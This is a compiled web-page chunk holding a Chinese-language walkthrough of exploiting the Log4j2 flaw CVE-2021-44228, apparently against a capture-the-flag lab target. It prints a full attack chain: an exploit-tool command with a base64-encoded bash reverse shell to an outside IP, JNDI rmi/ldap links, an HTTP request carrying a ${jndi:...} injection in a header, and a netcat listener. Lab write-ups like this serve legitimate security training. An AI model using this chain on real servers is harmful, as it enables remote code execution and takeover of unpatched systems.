import{_ as s,c as i,o as a,a1 as n}from"./chunks/framework.CJ8LAyNs.js";const c=JSON.parse('{"title":"CVE-2021-44228|Java安全-Log4j2日志组件漏洞复现","description":"","frontmatter":{},"headers":[],"relativePath":"articles/vulnerability/CVE-2021-44228 Log4j2漏洞复现.md","filePath":"articles/vulnerability/CVE-2021-44228 Log4j2漏洞复现.md"}'),h={name:"articles/vulnerability/CVE-2021-44228 Log4j2漏洞复现.md"},t=n(`<h1 id="cve-2021-44228-java安全-log4j2日志组件漏洞复现" tabindex="-1">CVE-2021-44228|Java安全-Log4j2日志组件漏洞复现 <a class="header-anchor" href="#cve-2021-44228-java安全-log4j2日志组件漏洞复现" aria-label="Permalink to &quot;CVE-2021-44228|Java安全-Log4j2日志组件漏洞复现&quot;">​</a></h1><h2 id="漏洞需求" tabindex="-1">漏洞需求 <a class="header-anchor" href="#漏洞需求" aria-label="Permalink to &quot;漏洞需求&quot;">​</a></h2><p>Java应用中带有log4j2组件,且其版本<code>Apache log4j </code>&lt;= 2.14.1</p><h2 id="漏洞原理" tabindex="-1">漏洞原理 <a class="header-anchor" href="#漏洞原理" aria-label="Permalink to &quot;漏洞原理&quot;">​</a></h2><p><img src="https://pic2.zhimg.com/80/v2-9856be233786686f93cbe193d7db3db9_1440w.webp" alt="img"></p><p>攻击者利用Log4J2 JNDI的机制，精心构造了一个特殊的请求，当Java应用程序将攻击者输入的数据，记入日志时（一般我们开发过程中，会使用Log4J记录重要的日志），Log4J发现需要向JNDI发起请求，而攻击者将输入的数据指向自己构造的攻击服务器上的LDAP服务，这个服务在返回数据中植入了恶意代码（可执行脚本），服务端收到LDAP的响应数据并去执行，导致被攻击。</p><p><strong>数据流:浏览器(带有JNDI请求的数据)-&gt;Java Application-&gt;攻击服务器-&gt;Java Application-&gt;恶意代码执行(常见为反弹shell)</strong></p><h2 id="复现过程" tabindex="-1">复现过程 <a class="header-anchor" href="#复现过程" aria-label="Permalink to &quot;复现过程&quot;">​</a></h2><p>使用工具<a href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0" target="_blank" rel="noreferrer">Release JNDI-Injection-Exploit v1.0 · welk1n/JNDI-Injection-Exploit (github.com)</a></p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">java</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -jar</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -C</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMjI5LjIxMC43NS8yMzMzMyAwPiYx}|{base64,-d}|{bash,-i}&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -A</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;111.229.210.75&quot;</span></span></code></pre></div><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[ADDRESS] </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> 111.229.210.75</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">[COMMAND] </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">&gt;&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> bash -c {</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">echo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMjI5LjIxMC43NS8yMzMzMyAwPiYx}</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">|</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">{base64,-d}|{bash,-i}</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">----------------------------JNDI</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Links----------------------------</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> </span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Target</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> environment</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Build</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> JDK</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1.8</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> whose</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> trustURLCodebase</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> is</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">rmi://111.229.210.75:1099/p7lcmg</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ldap://111.229.210.75:1389/p7lcmg</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Target</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> environment</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Build</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> JDK</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 1.7</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> whose</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> trustURLCodebase</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> is</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">rmi://111.229.210.75:1099/7lkv5j</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ldap://111.229.210.75:1389/7lkv5j</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Target</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> environment</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Build</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> JDK</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> whose</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> trustURLCodebase</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> is</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> false</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> and</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> have</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Tomcat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 8+</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> or</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SpringBoot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 1.2.x+</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> in</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> classpath</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">rmi://111.229.210.75:1099/iuetjo</span></span></code></pre></div><p>靶机<code>trustURLCodebase</code>=<code>False</code>,使用第三个payload进行攻击.</p><div class="language-HTTP vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">HTTP</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">GET</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> / </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">HTTP</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1.1</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Host</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 47.76.71.50:20096</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Upgrade-Insecure-Requests</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> 1</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">User-Agent</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Accept</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\${jndi:rmi://111.229.210.75:1099/iuetjo}</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Accept-Encoding</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> gzip, deflate, br</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Accept-Language</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> zh-CN,zh;q=0.9</span></span>
<span class="line"><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">Connection</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">:</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> close</span></span></code></pre></div><p>攻击机另开terminal,执行监听命令:</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">nc</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -lvp</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 23333</span></span></code></pre></div><p>收到shell后cat /flag即可得到靶机flag.</p>`,16),l=[t];function p(e,k,r,F,d,g){return a(),i("div",null,l)}const E=s(h,[["render",p]]);export{c as __pageData,E as default};
